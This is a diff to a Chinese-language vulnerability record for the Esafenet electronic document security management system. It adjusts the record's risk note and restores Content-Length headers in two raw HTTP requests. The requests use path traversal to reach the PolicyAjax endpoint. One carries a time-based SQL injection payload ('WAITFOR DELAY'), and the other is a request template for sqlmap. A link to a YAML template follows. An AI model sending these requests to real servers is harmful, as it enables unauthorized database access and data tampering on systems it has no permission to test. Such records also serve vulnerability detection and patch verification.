@@ -43,7 +43,7 @@ schema_version: "1"
 
 ## 操作风险
 
-请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -63,6 +63,7 @@ schema_version: "1"
 POST /CDGServer3/dojojs/../PolicyAjax HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Content-Length: 64
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
@@ -75,7 +76,7 @@ Upgrade-Insecure-Requests: 1
 command=selectOption&id=1';WAITFOR DELAY '0:0:5'--&type=JMCL
 ```
 
-> 请求长度说明：原资料 Content-Length 为 64；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 64；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 sqlmap
@@ -84,6 +85,7 @@ sqlmap
 POST /CDGServer3/dojojs/../PolicyAjax HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Content-Length: 64
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
@@ -96,7 +98,7 @@ Upgrade-Insecure-Requests: 1
 command=selectOption&id=1&type=JMCL
 ```
 
-> 请求长度说明：原资料 Content-Length 为 64；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 64；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 [亿赛通电子文档安全管理系统-policyajax-sql注入.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1713621695239-0f1784ad-ca08-49f2-8175-88860849d9db.yaml)
